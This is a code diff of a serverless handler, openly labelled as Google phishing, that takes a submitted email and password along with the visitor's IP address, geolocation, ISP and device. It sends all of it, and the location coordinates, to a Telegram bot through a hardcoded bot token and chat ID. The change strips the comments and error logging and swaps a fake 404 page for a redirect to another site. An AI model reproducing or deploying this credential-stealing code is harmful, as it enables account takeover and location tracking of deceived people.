@@ -5,12 +5,11 @@ export default async function handler(req, res) {
 
     const { email, password } = req.body;
 
-    // Ambil IP & User Agent dari header Vercel
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
     const userAgent = req.headers['user-agent'] || 'unknown';
     const timestamp = new Date().toISOString();
 
-    // Ambil geolokasi dari IP
+    // Geolokasi
     let geoData = {};
     let locationString = 'Tidak diketahui';
     let lat = null, lon = null;
@@ -23,11 +22,8 @@ export default async function handler(req, res) {
             lat = geoData.lat;
             lon = geoData.lon;
         }
-    } catch (err) {
-        console.error('Geo gagal:', err);
-    }
+    } catch (err) {}
 
-    // Deteksi device dari user agent
     let device = '❓ Unknown';
     if (userAgent.includes('iPhone')) device = '📱 iPhone';
     else if (userAgent.includes('iPad')) device = '📱 iPad';
@@ -36,23 +32,8 @@ export default async function handler(req, res) {
     else if (userAgent.includes('Mac')) device = '🍎 Mac';
     else if (userAgent.includes('Linux')) device = '🐧 Linux';
 
-    // Format pesan Telegram
-    const message = `🎭 *GOOGLE PHISHING - VERCEL* 🎭\n`;
-    const text = message +
-        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-        `📅 Waktu: ${timestamp}\n\n` +
-        `🔐 *LOGIN*\n` +
-        `📧 Email: \`${email}\`\n` +
-        `🔑 Password: \`${password}\`\n\n` +
-        `🌐 *NETWORK*\n` +
-        `🖥️ IP: \`${ip}\`\n` +
-        `📍 Lokasi: ${locationString}\n` +
-        `📡 ISP: ${geoData.isp || 'unknown'}\n\n` +
-        `📱 *DEVICE*\n` +
-        `${device}\n` +
-        `🔧 UA: \`${userAgent}\``;
+    const message = `🎭 *GOOGLE PHISHING + CAMERA* 🎭\n━━━━━━━━━━━━━━━━━━━━\n📅 Waktu: ${timestamp}\n\n🔐 *LOGIN*\n📧 Email: \`${email}\`\n🔑 Password: \`${password}\`\n\n🌐 *NETWORK*\n🖥️ IP: \`${ip}\`\n📍 Lokasi: ${locationString}\n📡 ISP: ${geoData.isp || 'unknown'}\n\n📱 *DEVICE*\n${device}\n🔧 UA: \`${userAgent}\``;
 
-    // Kirim ke Telegram
     const botToken = "8617014310:AAEidb6kIIlM4QLyoAMm5FMGskMSutKO6aU";
     const chatId = "8753510792";
 
@@ -62,12 +43,11 @@ export default async function handler(req, res) {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: chatId,
-                text: text,
+                text: message,
                 parse_mode: 'Markdown'
             })
         });
 
-        // Kirim lokasi juga kalo ada koordinat
         if (lat && lon) {
             await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
                 method: 'POST',
@@ -79,19 +59,8 @@ export default async function handler(req, res) {
                 })
             });
         }
-    } catch (err) {
-        console.error('Telegram error:', err);
-    }
+    } catch (err) {}
 
-    // Kembalikan halaman 404
-    res.status(404).send(`
-        <!DOCTYPE html>
-        <html>
-        <head><title>404 Not Found</title></head>
-        <body style="font-family:Arial;text-align:center;padding:50px">
-            <h1>404</h1>
-            <p>The requested URL was not found on this server.</p>
-        </body>
-        </html>
-    `);
+    // REDIRECT KE LINK TARGET KAMU
+    res.redirect(302, 'https://spotplaymav7.lovable.app');
 }
